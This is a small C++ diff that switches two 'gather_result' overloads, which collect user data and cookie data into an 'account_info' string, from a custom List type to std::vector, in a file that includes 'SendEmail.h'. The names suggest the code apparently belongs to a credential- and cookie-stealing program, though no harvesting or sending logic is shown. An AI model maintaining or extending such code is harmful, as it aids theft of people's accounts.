@@ -8,7 +8,7 @@
 #include "includes/SendEmail.h"
 
 
-void gather_result(const List<userData>& data, std::string& account_info)
+void gather_result(const std::vector<userData>& data, std::string& account_info)
 {
 	for (const auto& data : data)
 	{
@@ -18,7 +18,7 @@ void gather_result(const List<userData>& data, std::string& account_info)
 	}
 }
 
-void gather_result(const List<CookieData>& data, std::string& account_info)
+void gather_result(const std::vector<CookieData>& data, std::string& account_info)
 {
 	for (const auto& data : data)
 	{
